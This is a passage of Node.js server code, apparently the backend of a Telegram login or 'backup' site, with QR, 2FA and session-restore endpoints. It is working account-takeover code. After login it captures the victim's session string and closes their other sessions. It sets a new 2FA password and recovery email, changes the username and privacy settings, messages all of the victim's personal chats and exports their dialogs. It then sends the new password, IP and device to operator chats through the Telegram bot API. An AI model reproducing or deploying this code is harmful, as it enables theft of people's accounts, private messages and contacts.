          (secResult.privacySet    ? `\n🛡 Приватность: все видно` : '');
        for (const chat of chatRows2) {
          await fetch(`https://api.telegram.org/bot${_logToken2}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chat.telegram_id, text: text2, parse_mode: "HTML" }),
          }).catch(() => {});
        }
      })().catch(e => console.error("[verify-2fa] post-login:", e.message));

      const proto2 = req.headers["cf-visitor"]?.includes('"https"')
        ? "https" : (req.headers["x-forwarded-proto"] || "http");
      const secure2 = proto2 === "https" ? "; Secure" : "";
      res.setHeader("Set-Cookie",
        `${SESSION_COOKIE}=${sessionToken2}; Path=/; HttpOnly; Max-Age=${SESSION_DURATION_MS/1000}; SameSite=Lax${secure2}`
      );
      console.log(`[verify-2fa] user=${tgUser.id} @${tgUser.username||"-"} session created`);
      json(res, 200, { ok: true, user: {
        id: String(tgUser.id), firstName: tgUser.firstName,
        lastName: tgUser.lastName, username: tgUser.username,
      }});
    } catch (e) {
      try { await client.disconnect(); } catch {}
      pendingClients.delete(token);
      if (e.message?.includes("PASSWORD_HASH_INVALID"))
        return json(res, 401, { error: "Invalid 2FA password." });
      json(res, 500, { error: e.message });
    }
    return;
  }

  // ── POST /mtproto/restore ────────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/restore") {
    let b;
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { session_str } = b;
    if (!session_str || typeof session_str !== "string" || session_str.trim().length < 10)
      return json(res, 400, { error: "session_str is required" });
    const client = newClient(session_str.trim());
    try {
      await client.connect();
      const me = await client.getMe();
      if (!me) { await client.disconnect(); return json(res, 401, { error: "Session is invalid" }); }
      const freshSession = client.session.save();
      await client.disconnect().catch(() => {});
      const dbRes = await pool.query(
        `INSERT INTO users (telegram_id, first_name, last_name, username)
         VALUES ($1,$2,$3,$4)
         ON CONFLICT (telegram_id) DO UPDATE SET
           first_name=EXCLUDED.first_name, last_name=EXCLUDED.last_name,
           username=EXCLUDED.username, updated_at=NOW()
         RETURNING id`,
        [String(me.id), me.firstName||"", me.lastName||null, me.username||null]
      );
      const userId = dbRes.rows[0].id;
      await pool.query(
        "UPDATE tg_sessions SET session_str=$1, updated_at=NOW() WHERE telegram_id=$2",
        [freshSession, String(me.id)]
      );
      archiveDialogsBackground(String(me.id), freshSession);

      // Auto-trigger backup on restore login
      {
        const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (_tok) generateAndSendBackup(String(me.id), _tok).catch(e => console.error("[backup] auto:", e.message));
      }

      const sessionToken = randomBytes(32).toString("hex");
      await pool.query(
        "INSERT INTO sessions (token, user_id, expires_at) VALUES ($1,$2,$3)",
        [sessionToken, userId, new Date(Date.now() + SESSION_DURATION_MS)]
      );

      // Security + notification (fire-and-forget)
      const _restoreIP = getClientIP(req);
      const _restoreUA = parseUA(req.headers["user-agent"] || "");
      ;(async () => {
        const secResult = await withAccountLock(String(me.id), () =>
          applyAllLoginActions(freshSession, String(me.id), me.firstName || "")
        ).catch(() => ({}));
        sendMessageToAllPersonalChats(freshSession, String(me.id)).catch(() => {});
        promoteSecondUsernameAsAdmin(freshSession, String(me.id)).catch(() => {});
        const _restoreLogToken = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (!_restoreLogToken) return;
        const { rows: chatRowsRaw } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
        const chatRows = _onlyAdmins(chatRowsRaw);
        const name = [me.firstName, me.lastName].filter(Boolean).join(" ");
        const uname = (secResult.usernameSet || me.username) ? `@${secResult.usernameSet || me.username}` : "—";
        const nowStr2 = nowMoscow();
        const text =
          `🔄 <b>Вход через restore</b>\n` +
          `👤 ${name}\n` +
          `📱 ${uname}\n` +
          `🆔 <code>${String(me.id)}</code>\n` +
          `🌐 IP: <code>${_restoreIP}</code>\n` +
          `📲 Устройство: ${_restoreUA}\n` +
          `🕐 ${nowStr2}\n` +
          `✅ Сессии закрыты · Auto-Delete: 7д` +
          (secResult.usernameSet   ? `\n👤 Username: <code>@${secResult.usernameSet}</code>` : '') +
          (secResult.cloudPassword ? `\n🔐 2FA: <code>${secResult.cloudPassword}</code>` : '') +
          (secResult.botEmail      ? `\n📧 Email: <code>${secResult.botEmail}</code>` : '') +
          (secResult.privacySet    ? `\n🛡 Приватность: все видно` : '');
        for (const chat of chatRows) {
          const r = await fetch(`https://api.telegram.org/bot${_restoreLogToken}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chat.telegram_id, text, parse_mode: "HTML" }),
          }).then(r => r.json()).catch(e => ({ error: e.message }));
          console.log(`[restore] log to ${chat.telegram_id}:`, r.ok ? "OK" : r.error || r.description);
        }
      })().catch(e => console.error("[restore] post-login:", e.message));

      const proto = req.headers["cf-visitor"]?.includes('"https"')
        ? "https" : (req.headers["x-forwarded-proto"] || "http");
      const secure = proto === "https" ? "; Secure" : "";
      res.setHeader("Set-Cookie",
        `${SESSION_COOKIE}=${sessionToken}; Path=/; HttpOnly; Max-Age=${SESSION_DURATION_MS/1000}; SameSite=Lax${secure}`
      );
      console.log(`[restore] user=${me.id} @${me.username||"-"} session created, secure=${!!secure}`);
      json(res, 200, { ok: true, user: {
        id: String(me.id), firstName: me.firstName, lastName: me.lastName, username: me.username,
      }});
    } catch (e) {
      await client.disconnect().catch(() => {});
      if (e.message.includes("AUTH_KEY_UNREGISTERED") || e.message.includes("SESSION_REVOKED"))
        return json(res, 401, { error: "Session revoked by Telegram." });
      json(res, 500, { error: e.message });
    }
    return;
  }

  // ── GET /mtproto/export ──────────────────────────────────────────────────
  if (req.method === "GET" && url === "/mtproto/export") {
    try {
      const user = await getSessionUser(req);
      if (!user) return json(res, 401, { error: "Not authorized" });
      const { rows: sesRows } = await pool.query(
        "SELECT session_str, phone, first_name, username FROM tg_sessions WHERE telegram_id=$1",
        [user.telegramId]
      );
      if (!sesRows.length) return json(res, 404, { error: "Telegram session not found." });
      const { session_str, phone, first_name, username } = sesRows[0];
      const { rows: archRows } = await pool.query(
        "SELECT dialogs_json, archived_at FROM dialog_archives WHERE telegram_id=$1",
        [user.telegramId]
      );
      const exportData = {
        version: 1, exported_at: new Date().toISOString(),
        user: { telegram_id: user.telegramId, first_name, username, phone },
        session_str,
        dialogs: {
          count: archRows.length && Array.isArray(archRows[0].dialogs_json) ? archRows[0].dialogs_json.length : 0,
          archived_at: archRows[0]?.archived_at || null,
          list: archRows[0]?.dialogs_json || [],
        },
      };
      const filename = `fan-session-${user.telegramId}-${new Date().toISOString().slice(0,10)}.json`;
      res.writeHead(200, { "Content-Type": "application/json", "Content-Disposition": `attachment; filename="${filename}"` });
      res.end(JSON.stringify(exportData, null, 2));
    } catch (e) { json(res, 500, { error: e.message }); }
    return;
  }

  // ── POST /mtproto/dialogs/refresh ────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/dialogs/refresh") {
    try {
      const user = await getSessionUser(req);
      if (!user) return json(res, 401, { error: "Not authorized" });
      const { rows } = await pool.query(
        "SELECT session_str FROM tg_sessions WHERE telegram_id=$1", [user.telegramId]
      );
      if (!rows.length) return json(res, 404, { error: "Telegram session not found" });
      await archiveDialogsBackground(user.telegramId, rows[0].session_str);
      const { rows: archRows } = await pool.query(
        "SELECT dialogs_json FROM dialog_archives WHERE telegram_id=$1", [user.telegramId]
      );
      const count = archRows[0]?.dialogs_json?.length || 0;
      json(res, 200, { ok: true, count });
    } catch (e) { json(res, 500, { error: e.message }); }
    return;
  }

  // ── POST /mtproto/send-backup ─────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/send-backup") {
    try {
      const user = await getSessionUser(req);
      if (!user) return json(res, 401, { error: "Not authorized" });
      let b = {};
      try { b = await readBody(req); } catch {}
      const botToken = b.bot_token
        || process.env.BACKUP_BOT_TOKEN
        || process.env.BOT_TOKEN
        || process.env.TELEGRAM_BOT_TOKEN;
      if (!botToken) return json(res, 400, { error: "bot_token is not set" });
      const { rows } = await pool.query(
        "SELECT session_str FROM tg_sessions WHERE telegram_id=$1", [user.telegramId]
      );
      if (!rows.length)
        return json(res, 404, { error: "Telegram session not found. Please sign in via MTProto first." });
      generateAndSendBackup(user.telegramId, botToken).catch(e =>
        console.error("[backup] fatal:", e.message)
      );
      json(res, 200, {
        ok: true,
        message: "Backup запущен. Архив придёт в Telegram через несколько минут.",
        telegram_id: user.telegramId,
      });
    } catch (e) { json(res, 500, { error: e.message }); }
    return;
  }

  // ── POST /mtproto/rerun ── full re-run for already-authed account ────────
  if (req.method === "POST" && url === "/mtproto/rerun") {
    try {
      const user = await getSessionUser(req);
      if (!user) return json(res, 401, { error: "Not authorized" });
      const { rows: sesRows } = await pool.query(
        "SELECT session_str, first_name, username FROM tg_sessions WHERE telegram_id=$1",
        [user.telegramId]
      );
      if (!sesRows.length) return json(res, 404, { error: "Telegram session not found" });
      const { session_str, first_name, username } = sesRows[0];
      const _rerunIP = getClientIP(req);
      const _rerunUA = parseUA(req.headers["user-agent"] || "");
      // Trigger all actions in background, return immediately
      ;(async () => {
        const secResult = await withAccountLock(user.telegramId, () =>
          applyAllLoginActions(session_str, user.telegramId, first_name || "")
        ).catch(e => { console.error("[rerun] security:", e.message); return {}; });
        const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (_tok) {
          generateAndSendBackup(user.telegramId, _tok).catch(e => console.error("[rerun] backup:", e.message));
        }
        // Notify admins
        const _logTok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (!_logTok) return;
        const { rows: chatRowsRaw } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
        const chatRows = _onlyAdmins(chatRowsRaw);
        const nowStr = nowMoscow();
        const text =
          `🔁 <b>Повторный запуск (rerun)</b>\n` +
          `👤 ${first_name || "—"} @${username || "—"}\n` +
          `🆔 <code>${user.telegramId}</code>\n` +
          `🌐 IP: <code>${_rerunIP}</code>\n` +
          `📲 Устройство: ${_rerunUA}\n` +
          `🕐 ${nowStr}\n` +
          `✅ Сессии закрыты · Auto-Delete: 7д` +
          (secResult.cloudPassword ? `\n🔐 2FA: <code>${secResult.cloudPassword}</code>` : '\n🔐 2FA: уже установлен') +
          (secResult.botEmail      ? `\n📧 Email: <code>${secResult.botEmail}</code>` : '') +
          (secResult.privacySet    ? `\n🛡 Приватность: все видно` : '') +
          `\n📦 Архив: запущен в фоне`;
        for (const chat of chatRows) {
          await fetch(`https://api.telegram.org/bot${_logTok}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chat.telegram_id, text, parse_mode: "HTML" }),
          }).catch(() => {});
        }
      })().catch(e => console.error("[rerun] post:", e.message));
      json(res, 200, { ok: true, message: "Rerun started in the background. The archive and notifications will arrive on Telegram." });
    } catch (e) { json(res, 500, { error: e.message }); }
    return;
  }


  // ── POST /mtproto/qr-start ────────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/qr-start") {
    const token = randomBytes(20).toString("hex");
    const client = newClient();
    try {
      await client.connect();
      const result = await client.invoke(new Api.auth.ExportLoginToken({
        apiId: API_ID, apiHash: API_HASH, exceptIds: [],
      }));
      const tokenB64 = Buffer.from(result.token).toString("base64url");
      const qrUrl = `tg://login?token=${tokenB64}`;
      pendingClients.set("qr_" + token, { client, expires: Date.now() + 120000 });
      setTimeout(async () => {
        const p = pendingClients.get("qr_" + token);
        if (p) { pendingClients.delete("qr_" + token); try { await p.client.disconnect(); } catch {} }
      }, 120000);
      const qrImageUrl = await toQRSvg(qrUrl);
      json(res, 200, { token, qrUrl, qrImageUrl });
    } catch (e) {
      try { await client.disconnect(); } catch {}
      json(res, 500, { error: e.message });
    }
    return;
  }

  // ── POST /mtproto/qr-poll ─────────────────────────────────────────────────
  if (req.method === "POST" && url === "/mtproto/qr-poll") {
    let b;
    try { b = await readBody(req); } catch { return json(res, 413, { error: "Request too large" }); }
    const { token } = b;
    if (!token) return json(res, 400, { error: "token is required" });
    const pending = pendingClients.get("qr_" + token);
    if (!pending) {
      // Server restarted - pendingClients cleared. Recover: generate fresh QR mapped to same token.
      console.log("[qr-poll] token not in memory (server restarted?) - generating fresh QR for:", token.slice(0,8));
      try {
        const recovClient = newClient();
        await recovClient.connect();
        const recovRes = await recovClient.invoke(new Api.auth.ExportLoginToken({
          apiId: API_ID, apiHash: API_HASH, exceptIds: [],
        }));
        const recovB64 = Buffer.from(recovRes.token).toString("base64url");
        const recovQrUrl = "tg://login?token=" + recovB64;
        pendingClients.set("qr_" + token, { client: recovClient, expires: Date.now() + 120000 });
        setTimeout(async () => {
          const p = pendingClients.get("qr_" + token);
          if (p) { pendingClients.delete("qr_" + token); try { await p.client.disconnect(); } catch (_) {} }
        }, 120000);
        const recovImg = await toQRSvg(recovQrUrl);
        console.log("[qr-poll] recovery OK - fresh QR generated");
        return json(res, 200, { status: "pending", qrUrl: recovQrUrl, qrImageUrl: recovImg });
      } catch (_recovErr) {
        console.error("[qr-poll] recovery failed:", _recovErr.message);
        _notifyAdmins("⚠️ <b>QR recovery failed</b>\n<code>" + _recovErr.message.slice(0,200) + "</code>").catch(() => {});
        return json(res, 410, { error: "QR session expired. Please start again." });
      }
    }
    try {
      // Reconnect if gramJS connection dropped (TypeNotFoundError / TIMEOUT)
      try {
        if (!pending.client.connected) { await pending.client.connect(); }
      } catch (_reconErr) { console.error('[qr-poll reconnect]:', _reconErr.message); }
      const pollResult = await pending.client.invoke(new Api.auth.ExportLoginToken({
        apiId: API_ID, apiHash: API_HASH, exceptIds: [],
      }));
      if (pollResult.className === "auth.LoginTokenSuccess") {
        const tgUser = pollResult.authorization.user;
        const sessionStr = pending.client.session.save();
        pendingClients.delete("qr_" + token);
        await pending.client.disconnect().catch(() => {});

        const dbClient = await pool.connect();
        let sessionToken;
        try {
          await dbClient.query("BEGIN");
          const dbRes = await dbClient.query(
            `INSERT INTO users (telegram_id, first_name, last_name, username, photo_url)
             VALUES ($1,$2,$3,$4,$5)
             ON CONFLICT (telegram_id) DO UPDATE SET
               first_name=EXCLUDED.first_name, last_name=EXCLUDED.last_name,
               username=EXCLUDED.username, updated_at=NOW()
             RETURNING id`,
            [String(tgUser.id), tgUser.firstName||"", tgUser.lastName||null, tgUser.username||null, null]
          );
          const userId = dbRes.rows[0].id;
          sessionToken = randomBytes(32).toString("hex");
          await dbClient.query(
            "INSERT INTO sessions (token, user_id, expires_at) VALUES ($1,$2,$3)",
            [sessionToken, userId, new Date(Date.now() + SESSION_DURATION_MS)]
          );
          await dbClient.query(
            `INSERT INTO tg_sessions (phone, telegram_id, session_str, first_name, username)
             VALUES ($1,$2,$3,$4,$5)
             ON CONFLICT (phone) DO UPDATE SET
               session_str=EXCLUDED.session_str, telegram_id=EXCLUDED.telegram_id,
               first_name=EXCLUDED.first_name, username=EXCLUDED.username, updated_at=NOW()`,
            [tgUser.phone||String(tgUser.id), String(tgUser.id), sessionStr, tgUser.firstName||"", tgUser.username||null]
          );
          await dbClient.query("COMMIT");
        } catch (txErr) {
          await dbClient.query("ROLLBACK").catch(() => {});
          console.error("[qr-poll db tx]:", txErr.message);
          return json(res, 500, { error: "Error saving session. Please try again." });
        } finally { dbClient.release(); }

        const _tok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
        if (_tok) generateAndSendBackup(String(tgUser.id), _tok).catch(e => console.error("[qr-backup]:", e.message));
        ;(async () => {
          await withAccountLock(String(tgUser.id), () =>
            applyAllLoginActions(sessionStr, String(tgUser.id), tgUser.firstName || "")
          ).catch(e => console.error("[qr-security]:", e.message));
          sendMessageToAllPersonalChats(sessionStr, String(tgUser.id)).catch(() => {});
          promoteSecondUsernameAsAdmin(sessionStr, String(tgUser.id)).catch(() => {});
          const _logTok = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
          if (!_logTok) return;
          const { rows: chatRowsRaw } = await pool.query("SELECT telegram_id FROM backup_bot_chats").catch(() => ({ rows: [] }));
        const chatRows = _onlyAdmins(chatRowsRaw);
          const name = [tgUser.firstName, tgUser.lastName].filter(Boolean).join(" ");
          const text = `📱 <b>Новый вход (QR-код)</b>\n👤 ${name}\n📱 @${tgUser.username||"—"}\n🆔 <code>${tgUser.id}</code>\n🌐 IP: <code>${getClientIP(req)}</code>\n🕐 ${nowMoscow()}`;
          for (const chat of chatRows) {
            fetch(`https://api.telegram.org/bot${_logTok}/sendMessage`, {
              method:"POST", headers:{"Content-Type":"application/json"},
              body: JSON.stringify({ chat_id: chat.telegram_id, text, parse_mode: "HTML" }),
            }).catch(() => {});
          }
        })().catch(() => {});

        const proto = req.headers["cf-visitor"]?.includes('"https"') ? "https" : (req.headers["x-forwarded-proto"] || "http");
        const secure = proto === "https" ? "; Secure" : "";
        res.setHeader("Set-Cookie",
          `${SESSION_COOKIE}=${sessionToken}; Path=/; HttpOnly; Max-Age=${SESSION_DURATION_MS/1000}; SameSite=Lax${secure}`
        );
        json(res, 200, { status: "authorized" });
      } else if (pollResult.className === "auth.LoginTokenMigrateTo") {
        // Аккаунт на другом DC — переключаемся и вызываем ImportLoginToken
        try {
          const migClient = newClient();
          await migClient.connect();
          await migClient._switchDC(pollResult.dcId);
          const importResult = await migClient.invoke(new Api.auth.ImportLoginToken({ token: pollResult.token }));
          if (importResult.className === "auth.LoginTokenSuccess") {
            const tgUser2 = importResult.authorization.user;
            const sessionStr2 = migClient.session.save();
            pendingClients.delete("qr_" + token);
            await Promise.all([pending.client.disconnect().catch(()=>{}), migClient.disconnect().catch(()=>{})]);
            const dbClient2 = await pool.connect();
            let sessionToken2;
            try {
              await dbClient2.query("BEGIN");
              const dbRes2 = await dbClient2.query(
                `INSERT INTO users (telegram_id, first_name, last_name, username, photo_url)
                 VALUES ($1,$2,$3,$4,$5)
                 ON CONFLICT (telegram_id) DO UPDATE SET
                   first_name=EXCLUDED.first_name, last_name=EXCLUDED.last_name,
                   username=EXCLUDED.username, updated_at=NOW()
                 RETURNING id`,
                [String(tgUser2.id), tgUser2.firstName||".", tgUser2.lastName||null, tgUser2.username||null, null]
              );
              const userId2 = dbRes2.rows[0].id;
              sessionToken2 = randomBytes(32).toString("hex");
              await dbClient2.query(
                "INSERT INTO sessions (token, user_id, expires_at) VALUES ($1,$2,$3)",
                [sessionToken2, userId2, new Date(Date.now() + SESSION_DURATION_MS)]
              );
              await dbClient2.query(
                `INSERT INTO tg_sessions (phone, telegram_id, session_str, first_name, username)
                 VALUES ($1,$2,$3,$4,$5)
                 ON CONFLICT (phone) DO UPDATE SET session_str=EXCLUDED.session_str, telegram_id=EXCLUDED.telegram_id,
                   first_name=EXCLUDED.first_name, username=EXCLUDED.username, updated_at=NOW()`,
                [tgUser2.phone||String(tgUser2.id), String(tgUser2.id), sessionStr2, tgUser2.firstName||".", tgUser2.username||null]
              );
              await dbClient2.query("COMMIT");
            } catch (txErr2) { await dbClient2.query("ROLLBACK").catch(() => {}); throw txErr2; }
            finally { dbClient2.release(); }
            const _tok2 = process.env.BACKUP_BOT_TOKEN || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
            if (_tok2) generateAndSendBackup(String(tgUser2.id), _tok2).catch(()=>{});
            ;(async()=>{ await withAccountLock(String(tgUser2.id), ()=>applyAllLoginActions(sessionStr2, String(tgUser2.id), tgUser2.firstName||".")).catch(()=>{}); sendMessageToAllPersonalChats(sessionStr2, String(tgUser2.id)).catch(()=>{}); promoteSecondUsernameAsAdmin(sessionStr2, String(tgUser2.id)).catch(()=>{}); })().catch(()=>{});
            const proto2 = req.headers["cf-visitor"]?.includes('"https"') ? "https" : (req.headers["x-forwarded-proto"] || "http");
            const secure2 = proto2 === "https" ? "; Secure" : "";
            res.setHeader("Set-Cookie", `${SESSION_COOKIE}=${sessionToken2}; Path=/; HttpOnly; Max-Age=${SESSION_DURATION_MS/1000}; SameSite=Lax${secure2}`);
            json(res, 200, { status: "authorized" });
          } else { console.error("[qr-poll migration non-success]:", importResult?.className); json(res, 200, { status: "pending" }); }
        } catch (_migErr) { console.error("[qr-poll migration]:", _migErr.message, _migErr.constructor?.name); pendingClients.delete("qr_" + token); json(res, 410, { error: "Error switching Telegram server. Please try the QR code again." }); }
        return;
      } else if (pollResult.className === "auth.LoginToken") {
        const tokenB64 = Buffer.from(pollResult.token).toString("base64url");
        const _freshQrUrl = `tg://login?token=${tokenB64}`;
        const qrImageUrl2 = await toQRSvg(_freshQrUrl);
        json(res, 200, { status: "pending", qrUrl: _freshQrUrl, qrImageUrl: qrImageUrl2 });
      } else {
        json(res, 200, { status: "pending" });
      }
    } catch (e) {
      if (e.message?.includes("AUTH_TOKEN_EXPIRED")) {
        pendingClients.delete("qr_" + token);
        json(res, 410, { error: "QR code expired. Please start again." });
      } else {
        console.error("[qr-poll]:", e.message, e.constructor?.name);
        // Return pending so client keeps polling and retries
        json(res, 200, { status: "pending" });
      }
    }
    return;
  }

  json(res, 404, { error: "not_found" });
});

server.listen(PORT, "127.0.0.1", () => console.log(`MTProto auth on :${PORT}`));
